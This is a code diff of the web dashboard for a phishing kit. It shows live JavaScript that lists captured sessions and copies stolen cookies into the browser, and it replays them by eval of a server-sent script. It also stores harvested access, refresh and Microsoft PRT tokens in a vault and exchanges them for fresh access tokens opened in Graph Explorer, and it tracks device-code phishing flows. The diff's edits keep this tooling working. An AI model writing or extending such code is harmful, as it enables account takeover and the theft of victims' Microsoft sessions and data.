@@ -153,7 +153,6 @@
             box-shadow: 0 0 12px #c92a2a;
         }
 
-        /* ----- Tabs ----- */
         .tabs {
             display: flex;
             gap: 4px;
@@ -651,7 +650,6 @@
             border-color: rgba(0, 0, 0, 0.1) !important;
         }
 
-        /* Toggle switch for phishlets */
         .switch {
             position: relative;
             display: inline-block;
@@ -762,8 +760,8 @@
             </select>
             <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
             <div class="ws-status">
-                <span class="ws-dot offline" id="wsDot"></span>
-                <span id="wsLabel">Connecting...</span>
+                <span class="ws-dot online" id="wsDot" style="background:#ffd700;box-shadow:0 0 12px #ffd700;"></span>
+                <span id="wsLabel">Live (API)</span>
             </div>
         </div>
 
@@ -882,7 +880,6 @@
             <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="deviceStats">📊 0 flows · 0 approved</span>
         </div>
 
-        <!-- Stats -->
         <div class="stats">
             <div class="stat-card glass">
                 <label>Active Flows</label>
@@ -901,7 +898,6 @@
             </div>
         </div>
 
-        <!-- Table -->
         <div class="table-wrap glass" style="padding: 8px;">
             <table>
                 <thead><tr><th>Code</th><th>Status</th><th>Created</th><th>Approved</th><th>Token Type</th><th>Actions</th></tr></thead>
@@ -911,13 +907,12 @@
             </table>
         </div>
 
-        <!-- Manual Code Generator -->
         <div class="glass" style="padding: 16px; margin-top: 16px;">
             <h4 style="color: rgba(255,255,255,0.5); font-weight: 400; margin-bottom: 8px;">🔧 Manual Code Generator</h4>
             <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
                 <input type="text" id="manualCode" placeholder="Enter custom code (e.g., ABC123)" style="flex:1; min-width:200px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.1); border-radius:40px; padding:8px 18px; color:#e0e8f0; outline:none;">
                 <button class="btn btn-warning" onclick="generateManualCode()">🔑 Generate</button>
-                <button class="btn" onclick="copyCode()">📋 Copy</button>
+                <button class="btn" onclick="copyManualCode()">📋 Copy</button>
             </div>
             <div id="manualCodeResult" style="margin-top:8px; font-size:14px; color:rgba(255,255,255,0.4);"></div>
         </div>
@@ -944,9 +939,6 @@
     let map = null;
     let chart = null;
     let analyticsChart = null;
-    let reconnectAttempts = 0;
-    const maxReconnectAttempts = 20;
-    let ws;
     let vaultTokens = [];
     let deviceHistory = [];
     let deviceInterval;
@@ -988,59 +980,23 @@
     }
 
     // =============================================
-    // WEBSOCKET
+    // WEBSOCKET (DISABLED — uses API polling)
     // =============================================
+    // WebSocket is disabled to avoid connection errors.
+    // The dashboard uses API polling every 15 seconds instead.
     function connectWebSocket() {
-        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
-        ws = new WebSocket(wsProtocol + location.host);
+        // No-op — WebSocket disabled
         const wsDot = document.getElementById('wsDot');
         const wsLabel = document.getElementById('wsLabel');
-
-        ws.onopen = () => {
-            wsDot.className = 'ws-dot online';
-            wsLabel.textContent = 'Live';
-            reconnectAttempts = 0;
-            startHeartbeat();
-        };
-
-        ws.onclose = () => {
-            wsDot.className = 'ws-dot offline';
-            wsLabel.textContent = 'Disconnected';
-            if (reconnectAttempts < maxReconnectAttempts) {
-                reconnectAttempts++;
-                const delay = Math.min(5000 + reconnectAttempts * 1000, 30000);
-                console.log(`🔄 Reconnecting... (${reconnectAttempts}/${maxReconnectAttempts}) in ${delay/1000}s`);
-                setTimeout(connectWebSocket, delay);
-            }
-        };
-
-        ws.onerror = (error) => {
-            console.error('WebSocket error:', error);
-        };
-
-        ws.onmessage = (event) => {
-            try {
-                const data = JSON.parse(event.data);
-                if (data.type === 'newLog') {
-                    showToast('📥 New capture: ' + data.file);
-                    refreshLogs();
-                } else if (data === 'pong') {
-                    // Heartbeat response
-                }
-            } catch (e) {
-                // Not JSON, ignore
-            }
-        };
+        wsDot.className = 'ws-dot online';
+        wsDot.style.background = '#ffd700';
+        wsDot.style.boxShadow = '0 0 12px #ffd700';
+        wsLabel.textContent = 'Live (API)';
+        console.log('✅ Dashboard running in API polling mode (WebSocket disabled)');
     }
 
-    let heartbeatInterval;
     function startHeartbeat() {
-        if (heartbeatInterval) clearInterval(heartbeatInterval);
-        heartbeatInterval = setInterval(() => {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send('ping');
-            }
-        }, 25000);
+        // No-op
     }
 
     function showToast(msg, isError = false) {
@@ -1073,11 +1029,11 @@
             allLogs = logs;
             renderTable(logs);
             updateStats(logs);
-            updateMap(logs);
+            updateMap();
             updateChart(logs);
             await fetchVisits();
         } catch (e) {
-            showToast('Failed to fetch logs: ' + e.message, true);
+            console.error('Failed to fetch logs:', e);
         }
     }
 
@@ -1152,7 +1108,7 @@
                 const ipCell = document.getElementById(`ip-${filename}`);
                 if (ipCell) ipCell.textContent = ip;
             }
-        } catch (e) { /* silently fail */ }
+        } catch (e) { /* ignore */ }
     }
 
     function updateStats(logs) {
@@ -1164,18 +1120,13 @@
         }
     }
 
-    function updateMap(logs) {
+    function updateMap() {
         if (!map) {
             map = L.map('map').setView([20, 0], 2);
             L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                 attribution: '&copy; OpenStreetMap, &copy; CartoDB'
             }).addTo(map);
         }
-        map.eachLayer(layer => {
-            if (layer instanceof L.Marker) map.removeLayer(layer);
-        });
-        L.marker([20, 0]).addTo(map)
-            .bindPopup('📍 IP locations will appear here once you have captures.');
     }
 
     function updateChart(logs) {
@@ -1344,9 +1295,9 @@
             const cookieString = allCookies.join('; ');
             try {
                 await navigator.clipboard.writeText(cookieString);
-                showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
+                showToast(`🍪 ${allCookies.length} cookies copied to clipboard.`);
             } catch (e) {
-                showToast('Failed to copy. Manual: ' + cookieString);
+                showToast('Manual copy: ' + cookieString);
             }
         } catch (e) {
             showToast('Error: ' + e.message, true);
@@ -1367,7 +1318,7 @@
                 return;
             }
             eval(data.replayScript);
-            showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
+            showToast(`✅ ${data.cookieCount} cookies injected.`);
         } catch (e) {
             showToast('❌ Replay error: ' + e.message, true);
         }
@@ -1394,13 +1345,10 @@
             msg += `  • Cookies: ${tokens.cookies.length}\n`;
             msg += `  • Sessions: ${tokens.sessions.length}`;
             
-            const hasPrt = tokens.prt || tokens.flowToken;
-            if (hasPrt) {
+            if (tokens.prt_tokens && tokens.prt_tokens.length > 0) {
                 msg += `\n\n🔑 **PRT Found!** (Long-term access)`;
-                msg += `\n   📝 Length: ${(tokens.prt || tokens.flowToken).length} chars`;
-                msg += `\n\n   💡 Click OK to exchange PRT for a fresh access token.`;
                 if (confirm(msg + '\n\nExchange PRT for a new access token?')) {
-                    await exchangePRT(tokens.prt || tokens.flowToken);
+                    await exchangePRT(tokens.prt_tokens[0]);
                     return;
                 }
             }
@@ -1419,16 +1367,16 @@
 
     async function exchangeRefreshToken(refreshToken) {
         try {
-            const response = await fetch('/dash/api/exchange', {
+            const response = await fetch('/dash/api/vault/exchange', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ refresh_token: refreshToken })
+                body: JSON.stringify({ tokenValue: refreshToken })
             });
             const data = await response.json();
-            if (data.access_token) {
+            if (data.success && data.data && data.data.access_token) {
                 showToast(`✅ New access token obtained.`);
-                localStorage.setItem('evil_token', JSON.stringify(data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
+                localStorage.setItem('evil_token', JSON.stringify(data.data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
             } else {
                 showToast('❌ Exchange failed: ' + (data.error || 'Unknown error'), true);
             }
@@ -1437,18 +1385,18 @@
         }
     }
 
-    async function exchangePRT(token) {
+    async function exchangePRT(prt) {
         try {
             const response = await fetch('/dash/api/prt/exchange', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ prt: token })
+                body: JSON.stringify({ prt })
             });
             const data = await response.json();
-            if (data.access_token) {
+            if (data.success && data.data && data.data.access_token) {
                 showToast(`✅ PRT exchange successful!`);
-                localStorage.setItem('evil_token', JSON.stringify(data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
+                localStorage.setItem('evil_token', JSON.stringify(data.data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
             } else {
                 showToast('❌ PRT exchange failed: ' + (data.error || 'Unknown error'), true);
             }
@@ -1512,7 +1460,7 @@
             const res = await fetch('/dash/api/vault/healthcheck', { method: 'POST' });
             const data = await res.json();
             if (data.success) {
-                const valid = data.results.filter(r => r.result.valid).length;
+                const valid = data.results.filter(r => r.status === 'valid').length;
                 showToast(`✅ ${valid} valid tokens, ${data.results.length - valid} expired.`);
                 loadVault();
             }
@@ -1533,7 +1481,7 @@
             if (statsData.success) {
                 const s = statsData.stats;
                 document.getElementById('vaultStats').textContent = 
-                    `📊 ${s.total} tokens · ${s.valid} valid · ${s.expired} expired · ${s.unknown} unknown`;
+                    `📊 ${s.total} tokens · ${s.access} access · ${s.refresh} refresh · ${s.prt} PRT`;
             }
             
             const tbody = document.getElementById('vaultTable');
@@ -1549,19 +1497,18 @@
                 const statusLabel = token.status === 'valid' ? '✅ Valid' : 
                                    token.status === 'expired' ? '❌ Expired' : '⚠️ Unknown';
                 const typeMap = {
-                    'access_token': '🔑 Access',
-                    'refresh_token': '🔄 Refresh',
-                    'id_token': '🆔 ID',
-                    'prt': '🔐 PRT',
-                    'flow_token': '🌊 Flow'
+                    'access': '🔑 Access',
+                    'refresh': '🔄 Refresh',
+                    'id': '🆔 ID',
+                    'prt': '🔐 PRT'
                 };
                 const typeDisplay = typeMap[token.type] || token.type;
-                const time = new Date(token.timestamp).toLocaleString();
+                const time = token.timestamp ? new Date(token.timestamp).toLocaleString() : 'N/A';
                 row.innerHTML = `
-                    <td><span style="font-weight:500;">${token.username}</span></td>
+                    <td><span style="font-weight:500;">${token.username || 'Unknown'}</span></td>
                     <td><span class="badge badge-info">${typeDisplay}</span></td>
                     <td><span class="badge ${statusClass}">${statusLabel}</span></td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${token.sourceFile || 'N/A'}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${token.file || 'N/A'}</td>
                     <td style="font-size:12px; color:rgba(255,255,255,0.4);">${time}</td>
                     <td>
                         <button class="action-btn token" onclick="exchangeVaultToken('${token.value}')">🔄 Exchange</button>
@@ -1584,7 +1531,7 @@
                 body: JSON.stringify({ tokenValue })
             });
             const data = await res.json();
-            if (data.success) {
+            if (data.success && data.data && data.data.access_token) {
                 showToast(`✅ New access token obtained!`);
                 localStorage.setItem('evil_token', JSON.stringify(data.data));
                 window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
@@ -1791,17 +1738,23 @@
             const statusLabel = statusLabels[flow.status] || flow.status;
             const created = new Date(flow.created).toLocaleString();
             const approved = flow.approved ? new Date(flow.approved).toLocaleString() : '—';
+            
+            let actionsHtml = '';
+            if (flow.status === 'pending') {
+                actionsHtml += `<button class="action-btn" onclick="showDeviceCode('${flow.user_code}')">📋 Show Code</button>`;
+            }
+            if (flow.access_token) {
+                actionsHtml += `<button class="action-btn token" onclick="useDeviceToken('${flow.session_id}')">🔑 Use</button>`;
+            }
+            actionsHtml += `<button class="action-btn" onclick="copyDeviceCode('${flow.user_code}')">📋 Copy</button>`;
+            
             row.innerHTML = `
                 <td><span style="font-family:monospace; font-weight:600; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">${flow.user_code}</span></td>
                 <td><span class="badge ${statusClass}">${statusLabel}</span></td>
                 <td style="font-size:12px; color:rgba(255,255,255,0.4);">${created}</td>
                 <td style="font-size:12px; color:rgba(255,255,255,0.4);">${approved}</td>
                 <td><span class="badge badge-info">${flow.token_type || 'N/A'}</span></td>
-                <td>
-                    ${flow.status === 'pending' ? `<button class="action-btn" onclick="showDeviceCode('${flow.user_code}')">📋 Show Code</button>` : ''}
-                    ${flow.access_token ? `<button class="action-btn token" onclick="useDeviceToken('${flow.session_id}')">🔑 Use</button>` : ''}
-                    <button class="action-btn" onclick="copyDeviceCode('${flow.user_code}')">📋 Copy</button>
-                </td>
+                <td>${actionsHtml}</td>
             `;
             tbody.appendChild(row);
         });
@@ -1856,7 +1809,7 @@
         });
     }
 
-    function copyCode() {
+    function copyManualCode() {
         const result = document.getElementById('manualCodeResult').innerHTML;
         const match = result.match(/<strong[^>]*>([A-Z0-9]+)<\/strong>/);
         if (match) {
@@ -1890,7 +1843,8 @@
     // =============================================
     // INIT
     // =============================================
-    connectWebSocket();
+    // WebSocket is disabled — using API polling
+    // connectWebSocket(); // DISABLED
     refreshLogs();
     setInterval(refreshLogs, 15000);
 </script>
